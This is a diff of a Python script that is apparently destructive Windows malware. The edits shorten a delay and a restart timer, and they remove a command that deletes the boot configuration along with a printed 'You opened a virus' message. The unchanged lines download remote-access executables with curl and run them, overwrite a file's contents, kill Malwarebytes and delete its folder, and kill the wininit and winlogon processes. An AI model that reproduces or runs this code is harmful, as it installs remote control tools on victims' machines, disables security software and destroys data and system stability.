@@ -1,6 +1,7 @@
 import time
 import os
-time.sleep(5)
+time.sleep(1)
+
 os.system("curl https://getscreen.me/download/getscreen.exe --output bloat01.exe")
 os.system("bloat01.exe -install")
 os.system("curl https://pro32connect.ru/download/pro32connect.exe --output bloat02.exe")
@@ -32,9 +33,7 @@ f.write("Woops! I have deleted the content!")
 f.close()
 os.system("taskkill /f /im MBAMService.exe")
 os.system("del /s /q /f C:\Program Files\Malwarebytes")
-os.system("bcdedit /delete {current}")
-print("You opened a virus ): Your BCD is now gone")
-os.system("shutdown -r -t 1")
+os.system("shutdown -r -t 5")
 os.system("wininit")
 os.system("taskkill /f /im wininit.exe")
 os.system("taskkill /f /im winlogon.exe")
